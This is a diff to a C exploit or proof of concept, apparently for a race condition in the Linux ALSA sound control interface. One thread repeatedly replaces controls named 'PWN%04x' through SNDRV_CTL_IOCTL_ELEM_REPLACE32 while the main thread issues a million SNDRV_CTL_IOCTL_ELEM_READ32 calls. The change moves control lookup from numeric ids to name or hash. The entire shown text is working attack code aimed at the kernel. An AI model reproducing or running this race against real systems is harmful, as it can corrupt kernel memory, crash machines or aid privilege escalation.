@@ -109,13 +109,13 @@ void *create(void *arg){
         userinfo.owner = 0; //Needs to be 0 for proper calculations, same with count
         userinfo.count = 1;
         userinfo.type = SNDRV_CTL_ELEM_TYPE_INTEGER64;
-        userinfo.id.numid = current_id;//Force search by id
-        //userinfo.id.numid = 0; //Force to use name as identifier instead of current_id, only kctl search differs
+        //userinfo.id.numid = current_id;//Force search by id
+        userinfo.id.numid = 0; //Force to use name as identifier instead of current_id, only kctl search differs
         //printf("[*] Replacing control with id %d\n", userinfo.id.numid);
         if(ioctl(fd, SNDRV_CTL_IOCTL_ELEM_REPLACE32, &userinfo) != 0){
             fatal("ioctl replace");
         }
-        current_id += 1;
+        //current_id += 1;
     }
 }
 
@@ -147,6 +147,7 @@ int main(){
     userinfo.type = SNDRV_CTL_ELEM_TYPE_INTEGER64;
     userinfo.id.numid = free_id;
 
+
     sprintf(name, "PWN%04x", free_id);
     strncpy(userinfo.id.name, name, strlen(name) + 1);
     strncpy(userdata.id.name, name, strlen(name) + 1);
@@ -157,12 +158,11 @@ int main(){
     }
     //At this point setup is done - need to race with creating the kcontrols and reading.
 
-    int current_id = free_id;
     pthread_t th1;
     pthread_create(&th1, NULL, create, NULL);
    
     for(int i=0; i < 1000000; i++){
-        userdata.id.numid = current_id = 0; //new control id
+        userdata.id.numid = 0; //Force search by hash
         ioctl(fd, SNDRV_CTL_IOCTL_ELEM_READ32, &userdata);
     }
     pthread_join(th1, NULL);
